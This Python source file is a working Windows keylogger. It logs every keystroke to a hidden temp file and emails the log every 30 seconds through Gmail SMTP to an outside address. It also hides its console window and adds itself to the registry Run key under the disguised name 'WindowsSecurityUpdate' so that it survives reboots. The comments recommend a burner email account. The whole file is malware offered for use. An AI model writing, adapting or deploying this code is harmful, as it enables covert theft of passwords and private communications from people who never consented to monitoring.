import os
import smtplib
import threading
from pynput.keyboard import Listener
from datetime import datetime
import ctypes
import sys
import winreg

# Email setup (use a burner email and app password)
EMAIL_ADDRESS = "helloworld@gmail.com"  # Your email
EMAIL_PASSWORD = "00000000"  # The app-specific password
TO_EMAIL = "worldhello@gmail.com"  # Where logs will be sent

# Path for the log file (hidden in the temp folder)
log_file = os.path.join(os.getenv("TEMP"), "logs.txt")

# Set how often logs are sent (in seconds)
SEND_LOG_INTERVAL = 60 * 0.5  # Send logs every 30 seconds


# Function to log keystrokes to the file
def log_keystrokes(key):
    key = str(key).replace("'", "")
    with open(log_file, "a") as file:
        if key == "Key.space":
            file.write(" ")
        elif key == "Key.enter":
            file.write("\n")
        elif "Key" in key:
            file.write(f"[{key}]")
        else:
            file.write(key)


# Function to send logs via email
def send_email():
    try:
        with open(log_file, "r") as file:
            content = file.read()

        if content:
            server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.sendmail(EMAIL_ADDRESS, TO_EMAIL, content)
            server.quit()

        # Clear the log file after sending
        with open(log_file, "w"):
            pass
    except Exception as e:
        print(f"Error sending email: {e}")


# Function to periodically send the logs
def send_logs_periodically():
    send_email()
    threading.Timer(SEND_LOG_INTERVAL, send_logs_periodically).start()


# Function to hide the console window (invisibility)
def hide_console():
    if os.name == 'nt':  # For Windows
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)


# Function to add the keylogger to startup (persistence)
def add_to_startup():
    file_path = os.path.realpath(sys.argv[0])
    key = winreg.HKEY_CURRENT_USER
    key_value = r"Software\Microsoft\Windows\CurrentVersion\Run"
    key_to_open = winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS)
    winreg.SetValueEx(key_to_open, "WindowsSecurityUpdate", 0, winreg.REG_SZ, file_path)
    winreg.CloseKey(key_to_open)


# Main keylogger function
def run_keylogger():
    # Start the listener for keystrokes
    with Listener(on_press=log_keystrokes) as listener:
        listener.join()


# Main function to run the keylogger
def main():
    hide_console()
    add_to_startup()
    send_logs_periodically()
    run_keylogger()


if __name__ == "__main__":
    main()
